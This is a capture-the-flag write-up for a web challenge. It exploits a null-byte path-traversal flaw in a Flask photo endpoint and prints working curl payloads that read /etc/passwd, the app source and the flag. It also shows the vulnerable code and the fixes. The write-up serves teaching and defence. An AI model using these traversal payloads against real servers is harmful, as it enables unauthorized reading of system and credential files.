# Shreya's Type

## Challenge Overview
- Event: CyberGeek CTF
- Category: Web / Null Byte Path Traversal
- Prompt: Audit the employee directory photo endpoint for a file-read bug.
- Final Flag: geek{null_byt3_byp4ss_path_trav3rsal_ftw}

## Executive Summary
The image endpoint validates the extension before stripping a null byte, turning `../../flag.txt%00.jpg` into a working path-traversal payload that reads the flag.

## Solution Walkthrough
### Recon
The homepage showed three employee records and linked to:

- `/employee/1`
- `/employee/2`
- `/employee/3`

Each profile page referenced the employee photo through the same endpoint:

```text
/photo?photo=emp1.jpg
```

Basic probing showed:

- Valid image names returned image data
- Non-existent image-looking names returned `404 Error: File not found.`
- Non-image names returned `403 Error: Invalid file type. Only image files are allowed.`

That behavior suggested the backend was:

1. Checking only the filename suffix
2. Reading a local file based on user-controlled input

At that point, path traversal was the most likely bug class.

### Testing the File Handler
A normal traversal payload such as:

```bash
curl -sS -i --path-as-is \
  'https://shreya-shreya.vinm.me/photo?photo=../../../../etc/passwd'
```

was blocked because the input did not end in an allowed image extension.

But a null-byte payload changed the behavior:

```bash
curl -sS -i --path-as-is \
  'https://shreya-shreya.vinm.me/photo?photo=../../../../etc/passwd%00.png'
```

This returned the contents of `/etc/passwd`, confirming arbitrary file read.

Example result:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

So the extension check could be bypassed by appending `%00.png`.

### Source Disclosure
After confirming file read, the next step was to pull the Flask source through the same bug:

```bash
curl -sS --path-as-is \
  'https://shreya-shreya.vinm.me/photo?photo=../../../../proc/self/cwd/app.py%00.png'
```

The relevant part of the source was:

```python
filename = request.args.get('photo', '')

ALLOWED_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif')
if not filename.lower().endswith(ALLOWED_EXTENSIONS):
    return Response("Error: Invalid file type. Only image files are allowed.", status=403)

filename_clean = filename.split('\x00')[0]
filepath = os.path.join(UPLOAD_FOLDER, filename_clean)

if not os.path.isfile(filepath):
    return Response("Error: File not found.", status=404)
```

This made the bug explicit:

- Validation was performed on the original user input
- The null byte was stripped only after validation
- The path was joined directly with `UPLOAD_FOLDER`
- There was no canonicalization or directory boundary check

So a payload like:

```text
../../../../proc/self/root/flag.txt%00.png
```

would:

1. Pass the extension check because it ends in `.png`
2. Get truncated to `../../../../proc/self/root/flag.txt`
3. Be joined with the photo directory
4. Traverse out of that directory and read the target file

### Getting the Flag
Since the service was running inside a container, reading from:

```text
/proc/self/root/
```

was a reliable way to reference the container filesystem root.

The final request was:

```bash
curl -sS --path-as-is \
  'https://shreya-shreya.vinm.me/photo?photo=../../../../proc/self/root/flag.txt%00.png'
```

Response:

```text
geek{null_byt3_byp4ss_path_trav3rsal_ftw}
```

### Why It Worked
This was a combination of two issues:

1. Path traversal
   The application allowed `../` sequences to escape the intended `static/photos` directory.

2. Null byte bypass
   The application validated the extension before truncating at the null byte, so a benign-looking suffix could be added to a malicious path.

Either mistake is dangerous. Together they yielded direct arbitrary file read.

### Fix
The endpoint should:

- Reject null bytes entirely
- Use a strict allowlist of server-side filenames instead of trusting user input
- Resolve the final path with `os.path.abspath()` or `pathlib.Path.resolve()`
- Verify the resolved path stays inside the intended upload directory
- Avoid deriving content type from user-controlled filenames

## Flag
```text
geek{null_byt3_byp4ss_path_trav3rsal_ftw}
```
